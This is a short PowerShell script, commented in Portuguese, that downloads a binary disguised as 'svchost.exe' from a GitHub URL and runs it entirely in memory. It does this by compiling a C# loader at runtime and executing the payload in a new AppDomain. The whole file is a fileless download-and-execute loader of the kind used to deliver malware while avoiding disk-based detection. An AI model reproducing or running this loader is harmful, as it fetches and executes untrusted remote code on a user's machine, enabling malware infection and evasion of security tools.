# 1. URL para o seu .exe hospedado
$url = "https://github.com/bragaawy/pjl/raw/main/svchost.exe"

# 2. Baixa o .exe como um array de bytes
$webClient = New-Object System.Net.WebClient
$bytesDoExe = $webClient.DownloadData($url )

# --- NOVA TÉCNICA DE CARREGAMENTO ---

# 3. Define o código C# que será compilado e executado em tempo real
#    Este código cria um novo "mundo" (AppDomain) e executa nosso .exe lá dentro.
$codigoLoader = @"
using System;
using System.Reflection;
using System.Threading;

public class Loader
{
    [STAThread]
    public static void Executar(byte[] assemblyBytes)
    {
        // Cria um novo AppDomain para isolar nossa aplicação WPF
        AppDomain novoDominio = AppDomain.CreateDomain("DominioWPF");

        // Carrega nosso .exe no novo domínio e o executa
        novoDominio.ExecuteAssembly(assemblyBytes);
    }
}
"@

# 4. Compila o código do "Loader" em memória
Add-Type -TypeDefinition $codigoLoader -Language CSharp

# 5. Executa o nosso Loader, passando os bytes do nosso .exe para ele
[Loader]::Executar($bytesDoExe)
